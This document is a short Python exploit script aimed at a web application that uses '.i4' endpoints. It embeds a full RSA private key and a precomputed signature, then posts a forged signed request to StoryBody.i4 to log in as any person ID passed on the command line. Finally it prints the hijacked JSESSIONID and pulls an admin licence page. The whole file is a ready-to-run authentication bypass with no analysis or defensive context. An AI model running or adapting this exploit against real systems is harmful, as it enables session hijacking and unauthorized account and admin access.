import requests, sys, uuid

url = sys.argv[1]

ID = sys.argv[2]

"""
The Private Key

-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCkrT8rnZrnjKYzruZG5eswBmR70+vsNpz2Q1N2wBwlUcptzz+5mQ4usamFS6DQpfKGhOhoaMtd+c+rwsFj/lkMeoKJ+cP1zxN0ED/lGcwSNE7GSpm/G3sdQHVBoVVTuALhFklQj+Vrr/ebiHKi6InAdWhHGH8yteqI9BzL7YjHrrL3oCoLWh+M8RokNOSe5/ID7/WRDfJ+TPAWS4Ba+A/lOxWhXJiclM7Masc0jXz0M3YtkfePuKo+/THuV2/UFC/WwwECf/0qs1fJFLYiOJVIFIxc1ZQuRRhzJOmb7gDmSsaX0vozMS8bJfFhf2mXYX9K+H4cioDK8ZonqxseTnndAgMBAAECggEBAI321MiS/CG1vOo9U0O3nkMun52omnBuvG4IqIFtKFZ75lk4G6Wy7ukOPCgvhJmbFjMljP3FqdyAKanXIcVEVhxN2Q99hJP6Srj58TteO/FNqsODOHvqAv66vNsxbE/aCJFnFxkelBd8AafRv5H1ihuim5z+31kmPuSGHfUn94y8CgmSrIkd9CWcbZElkFskGYdYUAI34TFcYNBkurvH55eFrlJa8qq/2i6Ym75JkONG9ahctscz5khp2PW+KtLl9CtQobZyAlmkVpfr+o+Jl94SisM2D4VWU3CSo2i/HKIlrfKYjYxyMnNSgUF9WSwpHsuTcJswpVyRmet+pguEC0ECgYEA2FxiDC96URd46noYlCyzcbYLiMPGucLf6laAA1ps3P57NLOLkldbXIIfl8Ya9GajLuYkADHkrZm0fyWEH4VaWATdnEz70Eym5H5NLJ4kbYWvhZnTTAURH0vNOQQyojcFD7By2+9n1Usu0vN0k7tokPI2+CSdHtOFXK+kUKc878kCgYEAwtjO96mRP7+NCHsuWbRd27xqmpdSbNya0oaYjaEK7N7p+Tva4S4PE3zgLS4QKDxB8vLZh7zlsmf31FyuJ+TgCSGKa/Q4Kpp32vRHCoT+Sm7f+r8N1TxqbMZr1ddmqut4t2tK6W+xwfeZbjbOGNmK2Oub4wtOSHNhlvjOzmgNS3UCgYEA0IbZiN0JiraQt4zNu6IJoQLPwxTNp6QGo5iS8KhqW+R5YqXZU0YWq+ZOBL3OpNd3V3BAKl/sAtUtfY3u9WJVXJfz7vzThkMaZwbD4sjYWyaJsL49Q/tuMTehp94/3tAgdKqfSRJIhO5dRruWE/yAH5MTH75KILfExTwTphhJRuECgYEAhQG9HqDY7vxSSMTVmhSesX4IA2lisb9RzH5mqt+Q9qsgaqsqOebYEcR/vzeffefMWQzf42HWJpgEPCncFI2PRYxo0lKO+L4jLQrtZ8frUmIncSJ0TeiE+aXlPL9ibTB6YjLSm1FMtYzQZsTwoVP3DSagbjdsg9aHeqhze8DZunUCgYBst5P8k/h2FWqBpq1+gununsPrCVwVSZG/DqKAlMO08Y/ikmDIB5sCtcMgDkky4rqf7dAcV0TeXki3hVQI0ri1WebFKFerKy4N/43+FMdTWo9o/umL+7ZZGmPbYYX97XtdLekRqWO3uUzsw6xCC9fWoCCZ6H2uVIFEMpuHWkYj/A==
-----END PRIVATE KEY-----
"""

"""IS query params storyUUID + ts in this case PEWPEW+XXD"""
validSig = """FeHGWgaVoDHPbZYf0+I6BSAHBSacV/2MjbVtnaHLbnuW3cr0sLs2rwo1MWtZ1mtmNwjLLY1nXfZX+BL9FMwc4poix6WpEvQTGr0oxOmOQe82SF0/iJV8FRYNZPEJ8vVjuMh9c7zxo6A1zEqWRiTdWx5HFvF+saEIug6ujYIXx8jptzxMzkRn77FIx4McnPBLlfoodjkKXufrsK2JBOvqXjOsgJqv9SdZqcbm9LnQ4GolYGCHvsLZ9MTHFzIS37TNjRULVupdC92f+90Any6FvIYMsGiozp/c235+xPV68WNmLgLFsYyRR7RjN4oWq7yb+T5hIhlQnJr8CIej2eVq6w=="""

if __name__ == '__main__':
	s = requests.Session()
	s.get(url)

	s.post(
		url+"/StoryBody.i4",
		data = {
			"storyUUID": "PEWPEW",
			"ts": "XXD",
			"s":validSig,
			"action":"WHATEVER",
			"ipPerson":ID,
			"ipOrg":"1"
		}
	)

	print(f"Is Authenticated: {s.get(url+'/logonCheck.i4').status_code}")

	print(f"Authenticated JSESSIONID: {s.cookies.get('JSESSIONID')}")

	print(f"Licence: {s.get(url+f'/MIAdminLicenceAjax.i4;tab_token={uuid.uuid4()};m=1?REQUESTTOKEN=null').text}")